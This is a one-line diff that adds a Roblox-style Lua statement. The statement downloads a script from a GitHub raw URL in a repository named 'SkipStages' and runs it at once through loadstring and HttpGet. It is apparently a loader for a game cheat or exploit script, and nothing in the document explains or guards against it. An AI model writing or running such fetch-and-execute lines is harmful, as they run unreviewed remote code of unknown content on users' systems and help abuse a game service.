@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Vylo-dev/SkipStages/main/Muu'))()
